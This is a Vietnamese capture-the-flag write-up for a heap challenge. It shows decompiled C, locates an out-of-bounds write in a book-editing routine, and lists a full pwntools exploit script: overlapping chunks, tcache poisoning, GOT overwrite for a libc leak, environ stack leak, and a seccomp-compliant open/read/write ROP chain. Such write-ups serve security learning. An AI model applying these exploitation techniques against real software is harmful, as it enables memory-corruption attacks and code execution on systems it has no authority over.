# OVERLAPPING CHUNK AND TCACHE POISONING

Kiểm  tra các chế độ bảo vệ của chương trình:

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/6db44da5-0400-4db5-8466-06f3fbe63241)

chương trình được set seccomp :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/4ae09048-ba2a-4155-b363-7b61fe0c8e31)

Kiểm tra chương trình qua IDA để có thể hiểu được luồng thực thi của chương trình :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/1b5b0810-06dd-4586-ba2f-afa9db174a2b)

chương  trình sẽ cho ta nhập vô phần author_signature 12byte và 3 byte trước đó đã fixed as "BY: " + (author_signature+3), sau đó chương trình gọi hàm secure_library tạo ra một đống chunk trong tcahe và fast bin.
Sau đó thì nó sẽ gọi hàm write_books , là hàm thực thi chính của chương trình :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/3f9535dd-0327-41e9-9fd9-6c4cf2fceab1)

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/dcc24bbd-b3d5-4013-b749-762e4b9c83d9)

Chương trình sẽ chạy một vòng loop vô hạn và ta có 5option đó là 
```C
puts("What would you like to do today?");
puts("1. Write a book");
puts("2. Rewrite a book");
puts("3. Throw a book away");
puts("4. Exit the library");
return printf("Option: ");
/* option 5 sẽ là 1337 để có thể leak địa chỉ tại cái array books tương ứng ta sẽ dùng nó để leak heap và các giá trị khác như là libc và stack 
```

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/b2ec7be6-2d37-4d3b-9c4d-ceeef92e79ae)


Kiểm tra các hàm writebooks ,rewrite và throw như sau :

```C
unsigned __int64 write_book()
{
  int v0; // ebx
  _QWORD *v1; // rcx
  __int64 v2; // rdx
  int index; // [rsp+4h] [rbp-4Ch] BYREF
  size_t size; // [rsp+8h] [rbp-48h]
  __int64 buf[4]; // [rsp+10h] [rbp-40h] BYREF
  char v7; // [rsp+30h] [rbp-20h]
  unsigned __int64 v8; // [rsp+38h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  puts("\nAt which index of the shelf would you like to insert your book?");
  printf("Index: ");
  __isoc99_scanf("%d", &index);
  getchar();
  if ( index <= 0 || index > 10 || books[index - 1].BOOK_CONTENT )
  {
    puts("Invaid slot!");
  }
  else
  {
    --index;
    memset(buf, 0, sizeof(buf));
    v7 = 0;
    puts("Write me a book no more than 32 characters long!");
    size = read(0, buf, 0x20uLL) + 16;
    v0 = index;
    books[v0].BOOK_CONTENT = (__int64)malloc(size);
    memcpy((void *)books[index].BOOK_CONTENT, buf, size - 16);
    v1 = (_QWORD *)(books[index].BOOK_CONTENT + size - 16);
    v2 = qword_4040D8;
    *v1 = author_signature;
    v1[1] = v2;
    books[index].size = size;
    puts("Your book has been published!\n");
  }
  return v8 - __readfsqword(0x28u);
}

unsigned __int64 rewrite_book()
{
  _QWORD *v0; // rcx
  __int64 v1; // rdx
  int v3; // [rsp+Ch] [rbp-14h] BYREF
  ssize_t v4; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("\nAt which index of the shelf would you like to rewrite your book?");
  printf("Index: ");
  __isoc99_scanf("%d", &v3);
  getchar();
  if ( v3 > 0 && v3 <= 10 && books[v3 - 1].BOOK_CONTENT )
  {
    --v3;
    puts("Write me the new contents of your book that is no longer than what it was before.");
    v4 = read(0, (void *)books[v3].BOOK_CONTENT, books[v3].size);
    v0 = (_QWORD *)(books[v3].BOOK_CONTENT + v4);
    v1 = qword_4040D8;
    *v0 = author_signature;
    v0[1] = v1;
    puts("Your book has been rewritten!\n");
  }
  else
  {
    puts("Invaid slot!");
  }
  return v5 - __readfsqword(0x28u);
}

unsigned __int64 throw_book()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("\nAt which index of the shelf would you like to throw your book?");
  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 > 0 && v1 <= 10 && books[v1 - 1].BOOK_CONTENT )
  {
    free((void *)books[--v1].BOOK_CONTENT);
    books[v1].BOOK_CONTENT = 0LL;
    puts("Your book has been thrown!\n");
  }
  else
  {
    puts("Invaid slot!");
  }
  return v2 - __readfsqword(0x28u);
}
```
TA để ý rằng books được khai bào với 10phần tử BOOKS[10] tương ứng với 10 index ta có thể malloc.
Còn CHUNK sẽ dược malloc với size trong khoảng từ 0x20 đến 0x40 (vì phần signature của tác giả đã là 0x10 byte)

Và tại hàm rewrite( gọi là edit đi) có lỗi out of bound khi và ta sẽ có thể làm phần author_signature tràn xuống phần dưới và sẽ có thể overwrite metadata của chunk khác .


# KẾ HOẠCH KHAI THÁC
.1) overflow metadata của một chunk và tạo ra lỗi overlapping chunk

.2) tcahe poisoning để có thể leak địa chỉ libc(pie tắt nên ta sẽ có địa chỉ GOT)

.3) leak stack , overwite saved rip của main để có thể OPEN READ WRITE FLAG

# BƯỚC 1:

```python
p.sendlineafter(b"> ",b"A"*5+p8(0x41)) # author signature

# Chuẩn bị các chunk cần thiết và leak heap nhờ option 1337
add(1,b"A"*32)
add(2,b"")
fakechunk=flat(
	0,0,
	0,0x21 # fake size field
	)
add(3,fakechunk)
add(4,b"A"*32)
p.sendlineafter(b"Option: ",b"1337")
p.sendlineafter(b"What is your favourite number? ",b"1")
p.recvuntil(b"You found a secret message: ")
leak=int(p.recvline()[:-1],16)
log.info('[+]leak heap:'+hex(leak))
heap=leak-0x3d10
log.info('[+]heap base:'+hex(heap))
```
Heap sẽ trong như sau:

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/b2e2ac2b-19d1-4ad9-9421-ef98628ac088)

Bây giờ ta sẽ dùng hàm edit để edit chunk1 và ta sẽ nhập full 0x30 byte thì phần author_signature sẽ bị tràn xuống chunk2 dang có size là 0x20, và chunks2 sẽ có size là 0x41(tính cả phần metadata); giả dụ ta free chunk3 và nó ở trong tcahe ,
. Vì chunk2 có thể nhập đến 0x30byte tức là sẽ có thể ghi đè lên lên phần foward pointer của chunk3 ==> tcache poisoning

```python
free(4) #tcache 0x40 index 1

edit(1,b"A"*0x30)# over write size of chunk2 to 0x41
free(2)# chunk2 sẽ vô tcache 0x40 
#* fake size chunk 
payload=flat(
	1,1, # chunk2 
	0,0x41 # chunk3 size field
	)

add(2,payload) # lấy chunk2 giờ có size 0x40 ra và ta có thể sử dụng chunk2 để ghi đè chunk3 
free(3) # free chunk 3 vô tcahe bin 0x40 
```
# BƯỚC 2 leak LIBC

Sau khi đã free chunk4 và chunk3 thì 2 chunk này sẽ ở trong tcahe bin 0x40:
```java
tcahe bin 0x40: chunk3 <== chunk4
```

giờ ta sẽ edit chunk3 và làm cho chunk4 chỉ đển địa chỉ của thằng secret_msg và chỉnh nó về 0 để co thể sử dụng option 1337
.Sau đó ta sẽ overwrite GOT của free thành printf.plt để khi ta free một chunk thì nó sẽ in ra cho ta
```python
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^exe.sym['secret_msg'])
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out
chunk3=heap+0x3d70
chunk2=heap+0x3d50
add(10,flat(0,0,0x30,chunk3))# chunk10 sẽ chứa địa chỉ của secret_msg
#*leak libc
add(4,b"A"*32)
free(4)# tcahe 0x41 index 1
free(3)
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^exe.sym['books'])
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out
add(9,flat(0x30,exe.got['printf'],0x30,chunk2)) # chunk 9 sẽ chỉ đến chính địa chỉ của books và ta sẽ over write chunk1 thành got của printf để leak libc
```
Để ý rằng ngay sau secret_msg là địa chỉ của author_signature và sau khi ta ghi nội dung của chunk9 trỏ tới thằng books thì book[1]=exe.got['printf'],
book[2]=chunk2,và book[3]=author_signature nên ta sẽ overwrite thằng author_signature thành chunk3 luôn .

Thực hiện lại các bước như trên ta sẽ ghi đè thằng free_got thành printf.plt:
```python
add(4,b"A"*32)
free(4)# tcahe 0x41 index 1
free(3)
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^(0x404018-0x18))# free got-0x18
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out

add(8,flat(0,0,0,exe.plt['printf']))
free(1)
libc_leak=int.from_bytes(p.recvuntil(b"Your book has been thrown!",drop=True),'little')
log.info('[+]libc Leak:'+hex(libc_leak))
libc.address=libc_leak-libc.sym['printf']
log.info('[+]libc base:'+hex(libc.address))
```
Leak libc thành công!!!

# Bước 3 : leak stack 

Ta cũng làm tương tự như trên ,sử dụng environ để leak stack và sau đó tính saved_rip_main và ROP, và ta cũng cần ghi thằng free.got lại thành free để có thể tiếp tục sử dụng tcahe poisoning
```python
payload=flat(0x30,libc.sym['environ'],p64(0x30),p64(chunk2))
edit(9,payload)
free(1)
stack=int.from_bytes(p.recvuntil(b"Your book has been thrown!",drop=True),'little')
log.info('[+]Stack Leak:'+hex(stack))
saved_rip_main=stack-0x120
edit(8,flat(0,0,0,libc.sym['free']))
```
để ý rằng bây giờ ta có chunk9 chỉ đến chunk0 hay books . Vậy giờ ta chỉ cần edit chunk9 làm size của chunk thành số siêu to và chỉnh chunk1 chỉ đến địa chỉ của saved_rip_main và ta sẽ tạo ROP. thế thì cũng chẳng cần edit  để chỉnh free.got thành free àm gì =))

```python
payload=flat(
	b"./flag\x00\x00",0,
	0,0x41,
	0,0
	)
edit(2,payload)
### over write size of chunk1 and point chunk1 to saved rip of main
pop_rdi=libc.address+0x000000000002a3e5
mov_rax_rdi=libc.address+0x000000000013588f
pop_rax=libc.address+0x0000000000045eb0
pop_rsi=libc.address+0x00000000001303b2
pop_rdx_r12=libc.address+0x000000000011f497
syscall_ret=libc.address+0x0000000000091396
payload=flat(0x500,saved_rip_main)
edit(9,payload)

ROP=flat(
	pop_rax,2,
	pop_rsi,0,# O_RDONLY
	pop_rdi,chunk2,
	syscall_ret,
	# sysread
	#0x000000000005a2c1,# cli; mov rdi, rax; cmp rdx, rcx; jae 0x5a2ac; mov rax, r8; ret;
	pop_rax,0,
	pop_rsi,0x00000000404a00, #read write section
	pop_rdx_r12,100,0,
	pop_rdi,3, #rdi = file descripter
	syscall_ret,

	pop_rax,1,
	pop_rsi,0x00000000404a00,#read write section
	pop_rdi,1,
	syscall_ret
	)

edit(1,ROP)
p.sendlineafter(b"Option: ",b"4") # trigger main to return 
```
Chạy chương trình ta có flag :

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/33073fff-5427-41c6-97c6-79c7689c14b0)

flag: `grey{gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!}`








